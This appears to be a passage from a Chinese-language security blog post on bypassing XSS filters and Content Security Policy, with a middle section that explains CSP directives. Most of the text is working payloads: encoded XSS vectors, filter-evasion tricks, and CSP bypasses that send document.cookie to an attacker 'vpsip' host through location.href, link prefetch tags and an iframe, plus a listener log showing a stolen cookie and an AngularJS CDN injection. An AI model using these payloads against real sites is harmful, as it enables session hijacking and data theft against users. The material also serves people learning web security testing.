<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"x"</span> <span class="attr">onerror</span>=<span class="string">"<span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#40;</span><span class="symbol">&amp;#34;</span><span class="symbol">&amp;#120;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#34;</span><span class="symbol">&amp;#41;</span><span class="symbol">&amp;#59;</span>"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"x"</span> <span class="attr">onerror</span>=<span class="string">"eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b')"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>url编码绕过</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"x"</span> <span class="attr">onerror</span>=<span class="string">"eval(unescape('%61%6c%65%72%74%28%22%78%73%73%22%29%3b'))"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Ascii码绕过</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"x"</span> <span class="attr">onerror</span>=<span class="string">"eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>hex绕过</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">eval(</span>'\<span class="attr">x61</span>\<span class="attr">x6c</span>\<span class="attr">x65</span>\<span class="attr">x72</span>\<span class="attr">x74</span>\<span class="attr">x28</span>\<span class="attr">x27</span>\<span class="attr">x78</span>\<span class="attr">x73</span>\<span class="attr">x73</span>\<span class="attr">x27</span>\<span class="attr">x29</span>')&gt;</span></span><br></pre></td></tr></table></figure>
<p>八进制</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>'\<span class="attr">170</span>\<span class="attr">163</span>\<span class="attr">163</span>')&gt;</span></span><br></pre></td></tr></table></figure>
<p>base64绕过</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"x"</span> <span class="attr">onerror</span>=<span class="string">"eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw=='))"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4="</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="过滤双引号，单引号"><a href="#过滤双引号，单引号" class="headerlink" title="过滤双引号，单引号"></a>过滤双引号，单引号</h2><p>1.如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"x"</span> <span class="attr">onerror</span>=<span class="string">alert(</span>`<span class="attr">xss</span>`);&gt;</span></span><br></pre></td></tr></table></figure>
<p>2.使用编码绕过，具体看上面我列举的例子，我就不多赘述了</p>
<h2 id="过滤括号"><a href="#过滤括号" class="headerlink" title="过滤括号"></a>过滤括号</h2><p>当括号被过滤的时候可以使用throw来绕过</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">"window.onerror=eval;throw'=alert\x281\x29';"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="过滤url地址"><a href="#过滤url地址" class="headerlink" title="过滤url地址"></a>过滤url地址</h2><h3 id="使用url编码"><a href="#使用url编码" class="headerlink" title="使用url编码"></a>使用url编码</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"x"</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//%<span class="attr">77</span>%<span class="attr">77</span>%<span class="attr">77</span>%<span class="attr">2e</span>%<span class="attr">62</span>%<span class="attr">61</span>%<span class="attr">69</span>%<span class="attr">64</span>%<span class="attr">75</span>%<span class="attr">2e</span>%<span class="attr">63</span>%<span class="attr">6f</span>%<span class="attr">6d</span>/`&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="使用IP"><a href="#使用IP" class="headerlink" title="使用IP"></a>使用IP</h3><p>1.十进制IP</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"x"</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//<span class="attr">2130706433</span>/`&gt;</span></span><br></pre></td></tr></table></figure>
<p>2.八进制IP</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"x"</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//<span class="attr">0177.0.0.01</span>/`&gt;</span></span><br></pre></td></tr></table></figure>
<p>3.hex</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"x"</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//<span class="attr">0x7f.0x0.0x0.0x1</span>/`&gt;</span></span><br></pre></td></tr></table></figure>
<p>4.html标签中用//可以代替http://</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"x"</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`//<span class="attr">www.baidu.com</span>`&gt;</span></span><br></pre></td></tr></table></figure>
<p>5.使用<code>\\</code></p>
<p>但是要注意在windows下\本身就有特殊用途，是一个path 的写法，所以<code>\\</code>在Windows下是file协议，在linux下才会是当前域的协议</p>
<p>6.使用中文逗号代替英文逗号<br>如果你在你在域名中输入中文句号浏览器会自动转化成英文的逗号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;&quot;document.location&#x3D;&#96;http:&#x2F;&#x2F;www。baidu。com&#96;&quot;&gt;&#x2F;&#x2F;会自动跳转到百度</span><br></pre></td></tr></table></figure>



<h1 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h1><p><a href="https://www.ruanyifeng.com/blog/2016/09/csp.html" target="_blank" rel="noopener">Content Security Policy 入门教程</a><br>内容安全策略(CSP),CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。     </p>
<h2 id="CSP启用方法"><a href="#CSP启用方法" class="headerlink" title="CSP启用方法"></a>CSP启用方法</h2><p>一种是通过 HTTP 头信息的Content-Security-Policy的字段  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &#39;self&#39;; object-src &#39;none&#39;;</span><br><span class="line">style-src cdn.example.org third-party.org; child-src https:</span><br></pre></td></tr></table></figure>
<p>另一种是通过网页的<meta>标签  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Security-Policy&quot; content&#x3D;&quot;script-src &#39;self&#39;; object-src &#39;none&#39;; style-src cdn.example.org third-party.org; child-src https:&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>上面代码中，CSP 做了如下配置。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">脚本：只信任当前域名</span><br><span class="line">&lt;object&gt;标签：不信任任何URL，即不加载任何资源</span><br><span class="line">样式表：只信任cdn.example.org和third-party.org</span><br><span class="line">框架（frame）：必须使用HTTPS协议加载</span><br><span class="line">其他资源：没有限制</span><br></pre></td></tr></table></figure>
<p>启用后，不符合 CSP 的外部资源就会被阻止加载</p>
<h2 id="限制选项"><a href="#限制选项" class="headerlink" title="限制选项"></a>限制选项</h2><p><strong>资源加载限制</strong><br>以下选项限制各类资源的加载。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">script-src：外部脚本</span><br><span class="line">style-src：样式表</span><br><span class="line">img-src：图像</span><br><span class="line">media-src：媒体文件（音频和视频）</span><br><span class="line">font-src：字体文件</span><br><span class="line">object-src：插件（比如 Flash）</span><br><span class="line">child-src：框架</span><br><span class="line">frame-ancestors：嵌入的外部资源（比如&lt;frame&gt;、&lt;iframe&gt;、&lt;embed&gt;和&lt;applet&gt;）</span><br><span class="line">connect-src：HTTP 连接（通过 XHR、WebSockets、EventSource等）</span><br><span class="line">worker-src：worker脚本</span><br><span class="line">manifest-src：manifest 文件</span><br></pre></td></tr></table></figure>
<p>*<em>default-src *</em><br>default-src用来设置上面各个选项的默认值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#39;self&#39;</span><br></pre></td></tr></table></figure>
<p>上面代码限制所有的外部资源，都只能从当前域名加载。</p>
<p>如果同时设置某个单项限制（比如font-src）和default-src，前者会覆盖后者，即字体文件会采用font-src的值，其他资源依然采用default-src的值。</p>
<p><strong>URL 限制</strong><br>有时，网页会跟其他 URL 发生联系，这时也可以加以限制。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">frame-ancestors：限制嵌入框架的网页</span><br><span class="line">base-uri：限制&lt;base#href&gt;</span><br><span class="line">form-action：限制&lt;form#action&gt;</span><br></pre></td></tr></table></figure>
<p><strong>其他限制</strong><br>其他一些安全相关的功能，也放在了 CSP 里面。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">block-all-mixed-content：HTTPS 网页不得加载 HTTP 资源（浏览器已经默认开启）</span><br><span class="line">upgrade-insecure-requests：自动将网页上所有加载外部资源的 HTTP 链接换成 HTTPS 协议</span><br><span class="line">plugin-types：限制可以使用的插件格式</span><br><span class="line">sandbox：浏览器行为的限制，比如不能有弹出窗口等。</span><br></pre></td></tr></table></figure>
<p><strong>report-uri</strong><br>有时，我们不仅希望防止 XSS，还希望记录此类行为。report-uri就用来告诉浏览器，应该把注入行为报告给哪个网址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#39;self&#39;; ...; report-uri &#x2F;my_amazing_csp_report_parser;</span><br></pre></td></tr></table></figure>
<p>上面代码指定，将注入行为报告给/my_amazing_csp_report_parser这个 URL。 </p>
<h2 id="Content-Security-Policy-Report-Only"><a href="#Content-Security-Policy-Report-Only" class="headerlink" title="Content-Security-Policy-Report-Only"></a>Content-Security-Policy-Report-Only</h2><p>除了Content-Security-Policy，还有一个Content-Security-Policy-Report-Only字段，表示不执行限制选项，只是记录违反限制的行为。</p>
<p>它必须与report-uri选项配合使用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy-Report-Only: default-src &#39;self&#39;; ...; report-uri &#x2F;my_amazing_csp_report_parser;</span><br></pre></td></tr></table></figure>

<h2 id="选项值"><a href="#选项值" class="headerlink" title="选项值"></a>选项值</h2><p>每个限制选项可以设置以下几种值，这些值就构成了白名单。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">主机名：example.org，https:&#x2F;&#x2F;example.com:443</span><br><span class="line">路径名：example.org&#x2F;resources&#x2F;js&#x2F;</span><br><span class="line">通配符：*.example.org，*:&#x2F;&#x2F;*.example.com:*（表示任意协议、任意子域名、任意端口）</span><br><span class="line">协议名：https:、data:</span><br><span class="line">关键字&#39;self&#39;：当前域名，需要加引号</span><br><span class="line">关键字&#39;none&#39;：禁止加载任何外部资源，需要加引号</span><br></pre></td></tr></table></figure>
<p>多个值也可以并列，用空格分隔。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &#39;self&#39; https:&#x2F;&#x2F;apis.google.com</span><br></pre></td></tr></table></figure>
<p>如果同一个限制选项使用多次，只有第一次会生效。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 错误的写法</span><br><span class="line">script-src https:&#x2F;&#x2F;host1.com; script-src https:&#x2F;&#x2F;host2.com</span><br><span class="line"># 正确的写法</span><br><span class="line">script-src https:&#x2F;&#x2F;host1.com https:&#x2F;&#x2F;host2.com</span><br><span class="line">如果不设置某个限制选项，就是默认允许任何</span><br></pre></td></tr></table></figure>

<h2 id="script-src-的特殊值"><a href="#script-src-的特殊值" class="headerlink" title="script-src 的特殊值"></a>script-src 的特殊值</h2><p>除了常规值，script-src还可以设置一些特殊值。注意，下面这些值都必须放在单引号里面。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#39;unsafe-inline&#39;：允许执行页面内嵌的&lt;script&gt;标签和事件监听函数</span><br><span class="line">unsafe-eval：允许将字符串当作代码执行，比如使用eval、setTimeout、setInterval和Function等函数。</span><br><span class="line">nonce值：每次HTTP回应给出一个授权token，页面内嵌脚本必须有这个token，才会执行</span><br><span class="line">hash值：列出允许执行的脚本代码的Hash值，页面内嵌脚本的哈希值只有吻合的情况下，才能执行。</span><br></pre></td></tr></table></figure>
<p>nonce值的例子如下，服务器发送网页的时候，告诉浏览器一个随机生成的token。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &#39;nonce-EDNnf03nceIOfn39fn3e9h3sdfa&#39;</span><br></pre></td></tr></table></figure>
<p>页面内嵌脚本，必须有这个token才能执行。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script nonce&#x3D;EDNnf03nceIOfn39fn3e9h3sdfa&gt;</span><br><span class="line">  &#x2F;&#x2F; some code</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>hash值的例子如下，服务器给出一个允许执行的代码的hash值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &#39;sha256-qznLcsROx4GACP2dm0UCKCzCG-HiZ1guq6ZZDob_Tng&#x3D;&#39;</span><br></pre></td></tr></table></figure>
<p>下面的代码就会允许执行，因为hash值相符。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#39;Hello, world.&#39;);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>注意，计算hash值的时候，<code>&lt;script&gt;</code>标签不算在内。</p>
<p>除了script-src选项，nonce值和hash值还可以用在style-src选项，控制页面内嵌的样式表。</p>
<h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><p>（1）script-src和object-src是必设的，除非设置了default-src。</p>
<p>因为攻击者只要能注入脚本，其他限制都可以规避。而object-src必设是因为 Flash 里面可以执行外部脚本。</p>
<p>（2）script-src不能使用unsafe-inline关键字（除非伴随一个nonce值），也不能允许设置data:URL。</p>
<p>下面是两个恶意攻击的例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;&quot;evil()&quot;&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;data:text&#x2F;javascript,evil()&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>（3）必须特别注意 JSONP 的回调函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script</span><br><span class="line">src&#x3D;&quot;&#x2F;path&#x2F;jsonp?callback&#x3D;alert(document.domain)&#x2F;&#x2F;&quot;&gt;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>上面的代码中，虽然加载的脚本来自当前域名，但是通过改写回调函数，攻击者依然可以执行恶意代码。</p>
<h1 id="csp-绕过"><a href="#csp-绕过" class="headerlink" title="csp 绕过"></a>csp 绕过</h1><h2 id="location绕过"><a href="#location绕过" class="headerlink" title="location绕过"></a>location绕过</h2><p>大部分情况，csp不会限制跳转，CSP如果限制跳转会影响很多的网站功能；或者是script-src ‘unsafe-inline’;这条规则。<br>这个地方可以用location跳转：location.href(window.location/window.open)绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&#x2F;csp&#x2F;?url&#x3D;&lt;script&gt;location.href&#x3D;&#39;vpsip&#x2F;cookie&#x2F;&#39;%2bescape(document.cookie);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>利用条件:</p>
<ul>
<li>可以执行任意JS脚本，但是由于CSP无法数据带外</li>
<li>csp为script-src ‘unsafe-inline’;</li>
</ul>
<h2 id="link标签导致的绕过"><a href="#link标签导致的绕过" class="headerlink" title="link标签导致的绕过"></a>link标签导致的绕过</h2><p>这个方法其实比较老，去年我在我机器上试的时候还行，现在就不行了<br>因为这个标签当时还没有被CSP约束，当然现在浏览器大部分都约束了此标签，但是老浏览器应该还是可行的。<br>所以我们可以通过此标签将数据带外</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- firefox --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"dns-prefetch"</span> <span class="attr">href</span>=<span class="string">"//$&#123;cookie&#125;.vps_ip"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- chrome --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"prefetch"</span> <span class="attr">href</span>=<span class="string">"//vps_ip?$&#123;cookie&#125;"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>当然这个是我们写死的标签，如何把数据带外？</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> link = <span class="built_in">document</span>.createElement(<span class="string">"link"</span>);</span><br><span class="line">link.setAttribute(<span class="string">"rel"</span>, <span class="string">"prefetch"</span>);</span><br><span class="line">link.setAttribute(<span class="string">"href"</span>, <span class="string">"//vps_ip/?"</span> + <span class="built_in">document</span>.cookie);</span><br><span class="line"><span class="built_in">document</span>.head.appendChild(link);</span><br></pre></td></tr></table></figure>
<p>这样就可以把cookie带外了      </p>
<p>利用条件:</p>
<ul>
<li>可以执行任意JS脚本，但是由于CSP无法数据带外</li>
</ul>
<h2 id="Iframe绕过"><a href="#Iframe绕过" class="headerlink" title="Iframe绕过"></a>Iframe绕过</h2><p>当一个同源站点，同时存在两个页面，其中一个有CSP保护的A页面，另一个没有CSP保护B页面，那么如果B页面存在XSS漏洞，我们可以直接在B页面新建iframe用javascript直接操作A页面的dom，可以说A页面的CSP防护完全失效。</p>
<p>A页面<br>safe.php</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--safe.php--&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">'ye1s'</span>])) &#123;</span></span><br><span class="line"><span class="php">        setcookie(<span class="string">'ye1s'</span>,md5(rand(<span class="number">0</span>,<span class="number">1000</span>)));</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">        header(<span class="string">"Content-Security-Policy: default-src 'self';"</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSP<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>CSP-safe<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>B页面<br>index.php</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSP Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>index<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'ye1s'</span>])) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"Your GET content:"</span>.@$_GET[<span class="string">'ye1s'</span>];</span></span><br><span class="line"><span class="php">    &#125;<span class="comment">//</span></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里可以在index页面新建iframe用javascript直接操作safe页面的dom：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sc=<span class="string">"&lt;script&gt;</span></span><br><span class="line"><span class="string">var iframe = document.createElement('iframe');</span></span><br><span class="line"><span class="string">iframe.src=\"./safe.php\";</span></span><br><span class="line"><span class="string">document.body.appendChild(iframe);</span></span><br><span class="line"><span class="string">setTimeout(()=&gt;location.href='http://vpsip:12345/?cookie='+escape(document.cookie),1000);</span></span><br><span class="line"><span class="string">&lt;/script&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode($sc);</span><br></pre></td></tr></table></figure>

<p>vps监听</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ php -S 0.0.0.0:12345</span><br><span class="line">Listening on http://0.0.0.0:12345</span><br><span class="line">Press Ctrl-C to quit.</span><br><span class="line">[Wed Jun 30 09:41:27 2021] 221.224.30.130:3837 [404]: / - No such file or directory</span><br><span class="line">[Wed Jun 30 09:41:47 2021] 221.224.30.130:2637 [404]: /?cookie=ye1s%3D98dce83da57b0395e163467c9dae521b - No such file or directory</span><br></pre></td></tr></table></figure>


<p>利用条件:</p>
<ul>
<li>一个同源站点内存在两个页面，一个页面存在CSP保护，另一个页面没有CSP保护且存在XSS漏洞</li>
</ul>
<h2 id="CDN绕过"><a href="#CDN绕过" class="headerlink" title="CDN绕过"></a>CDN绕过</h2><p>一般来说，前端会用到许多的前端框架和库，部分企业为了减轻服务器压力或者其他原因，可能会引用其他CDN上的JS框架，如果CDN上存在一些低版本的框架，就可能存在绕过CSP的风险<br>这里给出orange师傅绕hackmd CSP的文章Hackmd XSS<br>案例中hackmd中CSP引用了cloudflare.com CDN服务，于是orange师傅采用了低版本的angular js模板注入来绕过CSP，如下</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; script-src 'unsafe-eval' https://cdnjs.cloudflare.com;"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- foo="--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span>&gt;</span></span><br><span class="line">    &#123;&#123;constructor.constructor('alert(document.cookie)')()&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
